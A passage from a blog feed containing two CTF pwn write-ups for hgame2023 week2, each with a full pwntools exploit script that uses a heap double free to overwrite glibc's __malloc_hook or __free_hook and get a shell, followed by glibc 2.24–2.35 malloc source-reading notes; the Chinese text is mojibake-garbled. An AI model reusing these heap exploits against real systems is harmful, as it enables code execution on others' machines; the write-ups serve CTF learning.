ˆï¼ŒpushæŒ‡ä»¤çš„æ•°é‡å¯ä»¥é€šè¿‡åç§»è°ƒæ•´</p><img src="/2023/01/23/fastbin-dup/realloc.png" class title="reallocï¼ˆlibc-2.23.soï¼‰"><p>æˆ‘ä»¬å¯ä»¥å°†malloc_hookå¡«å……ä¸ºrealloc+offsetï¼ˆoffsetå¯å–0ï¼Œ2ï¼Œ4ï¼Œ6ï¼Œ12ï¼Œ13ï¼‰ï¼Œoffsetè¶Šå¤§ï¼ŒpushæŒ‡ä»¤è¶Šå°‘ï¼Œæ ˆåœ°å€è¶Šé«˜ï¼›å†å°†realloc_hookå¡«å……ä¸ºone_gadgetã€‚è€Œrealloc_hookçš„åœ°å€å…¶å®å°±åœ¨malloc_hookä¸Šæ–¹</p><img src="/2023/01/23/fastbin-dup/realloc_hook.png" class title="realloc_hook"><p>åœ¨æ”¹fdæŒ‡é’ˆæ—¶å¯ä»¥ä¸€è¶Ÿæ”¹æ‰</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-comment">#p=process(&#x27;./fast&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">31626</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>malloc_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>one_addr=libcbase+<span class="hljs-number">0xf1247</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">0x8</span>)+p64(one_addr)+p64(realloc_addr+<span class="hljs-number">6</span>))<br><span class="hljs-comment">#add(8,0x10,b&#x27;a&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">8</span>).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>).encode())<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><h2 id="hgame2023-week2-new-fast-note"><a href="#hgame2023-week2-new-fast-note" class="headerlink" title="hgame2023 week2 new_fast_note"></a>hgame2023 week2 new_fast_note</h2><p>libcç‰ˆæœ¬2.31</p><h3 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ²¡å•¥éš¾åº¦ï¼Œå°±æ˜¯tcacheç‰ˆæœ¬çš„fastbin double freeï¼Œä¸è¯´äº†ã€‚å°±æ˜¯æ³¨æ„è¿™é“é¢˜æ²¡æœ‰é‡å¤mallocçš„æ£€æŸ¥äº†ï¼ˆåšçš„æ—¶å€™æ²¡çœ‹è§QAQï¼‰</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-comment">#p=process(&#x27;./new&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30170</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br>show(<span class="hljs-number">7</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i)<br>delete(<span class="hljs-number">7</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,p64(free_hook))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x20</span>,p64(system_addr))<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">11</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.24-2.35å †ç›¸å…³æºç é˜…è¯»ç¬”è®°</title>
    <link href="/2023/01/22/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/"/>
    <url>/2023/01/22/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<p>æºç é˜…è¯»ç¬”è®°è®¡åˆ’ä¹‹äºŒï¼èŒƒå›´æ˜¯2.24â€”â€”2.35glibcçš„malloc.cæºç ï¼ˆä»…åŒ…å«æºç çš„å˜åŒ–éƒ¨åˆ†çš„è§£æï¼‰<br>psï¼šå·äº†ä¸ªæ‡’åªåˆ†æäº†æˆ‘æ„Ÿè§‰æœ‰å½±å“çš„å˜åŒ–(â—Ë‡âˆ€Ë‡â—)</p><span id="more"></span><h1 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h1><ul><li>MALLOC_ALIGNMENTå®šä¹‰æ”¹å˜<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MALLOC_ALIGNMENT</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 * SIZE_SZ &lt; __alignof__ (long double) \</span><br><span class="hljs-meta"> ? __alignof__ (long double) : 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>å¢åŠ äº†å®DUMPED_MAIN_ARENA_CHUNK(p)ï¼ŒéªŒè¯mmapçš„å†…å­˜ã€‚<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* These variables are used for undumping support.  Chunked are marked</span><br><span class="hljs-comment">   as using mmap, but we leave them alone if they fall into this</span><br><span class="hljs-comment">   range.  NB: The chunk size for these chunks only includes the</span><br><span class="hljs-comment">   initial size field (of SIZE_SZ bytes), there is no trailing size</span><br><span class="hljs-comment">   field (unlike with regular mmapped chunks).  */</span><br><span class="hljs-type">static</span> mchunkptr dumped_main_arena_start; <span class="hljs-comment">/* Inclusive.  */</span><br><span class="hljs-type">static</span> mchunkptr dumped_main_arena_end;   <span class="hljs-comment">/* Exclusive.  */</span><br><br><span class="hljs-comment">/* True if the pointer falls into the dumped arena.  Use this after</span><br><span class="hljs-comment">   chunk_is_mmapped indicates a chunk is mmapped.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DUMPED_MAIN_ARENA_CHUNK(p) \</span><br><span class="hljs-meta">  ((p) &gt;= dumped_main_arena_start &amp;&amp; (p) &lt; dumped_main_arena_end)</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h1><p>å¢åŠ äº†ä¸€äº›æ–¹ä¾¿ä½¿ç”¨çš„å®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><br><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span><br><br><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span><br></code></pre></td></tr></table></figure><h1 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h1><h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="tcacheç›¸å…³å®å®šä¹‰"><a href="#tcacheç›¸å…³å®å®šä¹‰" class="headerlink" title="tcacheç›¸å…³å®å®šä¹‰"></a>tcacheç›¸å…³å®å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="tcacheç›¸å…³å‡½æ•°å’Œç»“æ„ä½“"><a href="#tcacheç›¸å…³å‡½æ•°å’Œç»“æ„ä½“" class="headerlink" title="tcacheç›¸å…³å‡½æ•°å’Œç»“æ„ä½“"></a>tcacheç›¸å…³å‡½æ•°å’Œç»“æ„ä½“</h3><p>tcacheå®ç°ä¸»è¦ç»“æ„ä½“tcache_perthread_structæ”¾åœ¨å †çš„å¼€å¤´ï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªchunkï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread <span class="hljs-type">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br><span class="hljs-comment">//tcache_entryæŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkçš„dataéƒ¨åˆ†ï¼ï¼ï¼</span><br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br><span class="hljs-comment">//æ–­è¨€é”™è¯¯ï¼Œæœ¬æ„æ˜¯æ£€æŸ¥counts&gt;0æ˜¯å¦æˆç«‹ï¼Œå¯èƒ½ä¼šé€ æˆè´Ÿæ•°æº¢å‡º</span><br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br><br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br><br>  arena_get (ar_ptr, bytes);<br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>  <span class="hljs-keyword">if</span> (victim)<br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAYBE_INIT_TCACHE()</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h3 id="libc-mallocå‡½æ•°å˜åŒ–"><a href="#libc-mallocå‡½æ•°å˜åŒ–" class="headerlink" title="__libc_mallocå‡½æ•°å˜åŒ–"></a>__libc_mallocå‡½æ•°å˜åŒ–</h3><p>å¼€å¤´å¢åŠ tcacheåˆå§‹åŒ–å’Œå¦‚æœtcacheéç©ºåˆ™ä»tcacheä¸­å–chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 